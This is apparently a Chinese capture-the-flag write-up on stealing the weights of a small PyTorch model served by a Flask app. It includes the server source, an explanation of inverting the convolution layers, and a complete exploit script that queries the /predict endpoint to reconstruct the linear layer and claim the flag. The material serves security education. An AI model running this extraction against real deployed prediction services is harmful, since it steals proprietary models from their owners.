# WP

观察以下app.py源码

```python
from flask import Flask, request, jsonify, render_template
import torch
import torch.nn as nn
import torch.optim as optim
import torchvision.models as models
import torchvision.datasets as datasets
import torchvision.transforms as transforms
from torch.utils.data import DataLoader, Subset, Dataset
import base64
import io
import numpy as np
import os
app = Flask(__name__)

class Net(nn.Module):

    def __init__(self):
        super(Net, self).__init__()
        self.linear = nn.Linear(256, 256)
        self.conv=nn.Conv2d(1, 1, (3, 3), stride=1)

        self.conv1=nn.Conv2d(1, 1, (2, 2), stride=2)

    def forward(self, x):
        x = nn.functional.pad(x, (2, 0, 2, 0), mode='constant', value=0)
        x = self.conv(x)
        x = self.conv1(x)
        x = x.view(-1)
        x = self.linear(x)
        return x

device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
model = Net().to(device)
model.load_state_dict(torch.load('/app/model.pth', weights_only=True, map_location=device))

user_model = Net().to(device)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/predict', methods=['POST'])
def predict():
    if 'image' not in request.json:
        return jsonify({'error': '没有提供图像'}), 400
    
    try:
        image_data = request.json['image']
        tensor_back = torch.tensor(image_data).to(device)

        with torch.no_grad():
            outputs = model(tensor_back)
        
        return jsonify({'prediction': outputs.tolist()})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/flag', methods=['POST'])
def flag():
    if 'model' not in request.json:
        return jsonify({'error': '没有提供模型文件'}), 400
    
    try:
        model_data = base64.b64decode(request.json['model'])
        model_file = io.BytesIO(model_data)
        user_model.load_state_dict(torch.load(model_file, weights_only=True, map_location=device))
        

        for i, (param, user_param) in enumerate(zip(model.parameters(), user_model.parameters())):
            

            if torch.sum(abs(param - user_param) > 0.01):
                return jsonify({'error': f'Layer weight difference too large'}), 400
        
        with open('/app/flag', 'r') as f:
            flag = f.read()
        return jsonify({'flag': f'Here is your flag: {flag}'})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True,host="0.0.0.0", port=8080)



```

可以发现，其中包含了模型的结构，其有两层卷积层和一层线性层，并且提供了两个路由，分别是predict与flag，predict接收发送的list然后转成tensor并喂给模型，然后把模型的输出发送回去，flag路由接收模型权重，然后有user_model进行加载，要求是与远程自己的模型数值差异最大不超过0.01。

结合题目给出的是迁移学习，那么我们可以得到两层卷积层并没有参与训练，那么现在的关键就是需要窃取线性层的模型权重，其包括weight和bias，线性层本质是矩阵线性运算y=weight*x+bias，理论上可以通过随机输入输出x和y得到的两组方程来求解weight和bias，但是由于构造出来的x基本都是奇异矩阵并不可逆，导致没法通过此方法进行计算，其本质是因为模型的输入需要经过两层卷积层才是线性层的输入x，如果我们只是单纯的构造构造模型输入经过卷积层计算后的x很难是奇异矩阵，为了解决这种情况，我们得出以下做法。

通过构造x然后通过卷积层逆向得到构造的x对应的模型输入，从而得到对应的y，然后进行计算，可以考虑构造两个可逆的矩阵x，本做法采用的是先构造一个全0的矩阵x，然后得到bias，接下来构造一个全0的但是某个位置i是1，这样y对应的就是weight的第i列数据，如此可以完美恢复weight与bias，当然两个可逆矩阵x然后联立求解也是可以的。

接下来考虑如何逆向卷积层，从下往上考虑，第二层卷积层卷积核是2\*2，且步长是2，而且卷积核的值是并没有什么特殊的，但是我们要注意，模型数据构造与模型数据逆向是有区别的，模型数据逆向是需要完美还原的要求可逆，但很明显这一层并不可逆，但是我们现在是模型数据构造，我们只需要构造出一个合法的层输入使得层输出为我们目标内容即可，那么我们对于每个卷积核的2\*2内容直接只取左上角有值其他为零，那么只需要将输出的当前数字\*2即可，因为卷积核的weight左上角数值恰好为0.5。

第一层卷积层因为上方和左方各填充了2像素，结合3*3的卷积层和1的步长，导致输入是64\*64那么输出也是64\*64的大小，没有信息的损失，而且填充的是0，那么从左到右从上到下，卷积核扫的时候，第一次因为九个数字里有八个0所以输入的第一行第一列可以计算，然后随着卷积核的移动，第二列也可以算，以此类推，可以把weight全部都计算出来，那么这样子就可以完整推导出x对应的模型输入了。

```python
import torch
import torch.nn as nn
from tqdm import tqdm
import numpy as np
import requests
import base64
import io

url = 'http://127.0.0.1:8080'
n=256

linear_input_num = 16
conv1_input_num = 32
conv_input_num = 32

input_size = 32

class Net(nn.Module):

    def __init__(self):
        super(Net, self).__init__()
        self.linear = nn.Linear(n, n)
        self.conv=nn.Conv2d(1, 1, (3, 3), stride=1)

        self.conv1=nn.Conv2d(1, 1, (2, 2), stride=2)

    def forward(self, x):
        x = nn.functional.pad(x, (2, 0, 2, 0), mode='constant', value=0)
        x = self.conv(x)
        x = self.conv1(x)
        x = x.view(-1)
        x = self.linear(x)
        return x
    
device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
model = Net().to(device)

model_weights_path = 'model_base.pth'
model.load_state_dict(torch.load(model_weights_path, map_location=device))

W = [[0 for _ in range(n)] for _ in range(n)]
b = torch.zeros(n, requires_grad=True)

def get_predict(model_input):

    response = requests.post(url + '/predict', 
                            json={'image': model_input.tolist()},
                            headers={'Content-Type': 'application/json'})
    logits = torch.tensor([response.json()['prediction']], dtype=torch.float32)[0]
    return logits

def attack_model(linear_input):
    linear_input = torch.tensor(linear_input).view(linear_input_num,linear_input_num)
    conv1_input = [[0 for _ in range(conv1_input_num)] for _ in range(conv1_input_num)]
    for j in range(linear_input_num):
        for k in range(linear_input_num):
            x = linear_input[j][k] - model.conv1.bias
            x = x.detach().cpu().numpy()
            x = x[0]
            conv1_input[j*2][k*2] = x*2
    '''conv1_input = torch.tensor(conv1_input, dtype=torch.float32).unsqueeze(0).unsqueeze(1).to(device)
    print(conv1_input)
    print(model.conv1(conv1_input).view(-1))'''
    conv_input = [[0 for _ in range(conv_input_num+2)] for _ in range(conv_input_num+2)]
    for j in range(conv1_input_num):
        for k in range(conv1_input_num):
            x = conv1_input[j][k] - model.conv.bias
            x = x.detach().cpu().numpy()
            x = x[0]
            for a in range(3):
                for b in range(3):
                    weight = model.conv.weight[0][0][a][b].detach().cpu().numpy()
                    x -= conv_input[j+a][k+b]*weight
            weight = model.conv.weight[0][0][2][2].detach().cpu().numpy()
            conv_input[j+2][k+2] = x / weight
    conv_input = torch.tensor(conv_input, dtype=torch.float32).unsqueeze(0).to(device)
    x = conv_input
    x = model.conv(x)
    conv_input = conv_input[:, 2:, 2:]
    logits = get_predict(conv_input)
    return logits

b = attack_model([0 for _ in range(n)]).to(device)

print(b)
print(model.linear.bias)

for i in tqdm(range(n)):
    linear_input = [0 for _ in range(n)]
    linear_input[i] = 1
    
    weight_line = attack_model(linear_input).to(device) - b
    weight_line = weight_line.detach().cpu().numpy()
    for j in range(len(weight_line)):
        W[j][i] = weight_line[j]
W = torch.tensor(W).to(device)

model.linear.weight.data = W
model.linear.bias.data = b
torch.save(model.state_dict(), 'model_exp.pth')


model.load_state_dict(torch.load('model_exp.pth', weights_only=True, map_location=torch.device('cpu')))
state_dict = model.state_dict()

# 将 state_dict 保存到字节流中
buffer = io.BytesIO()
torch.save(state_dict, buffer)
buffer.seek(0)  # 将流指针移动到开始位置

# 将字节流转换为 Base64 字符串
base64_string = base64.b64encode(buffer.read()).decode('utf-8')
response3 = requests.post(url + '/flag', 
                        json={'model': base64_string},
                        headers={'Content-Type': 'application/json'})
print(response3.json())
```

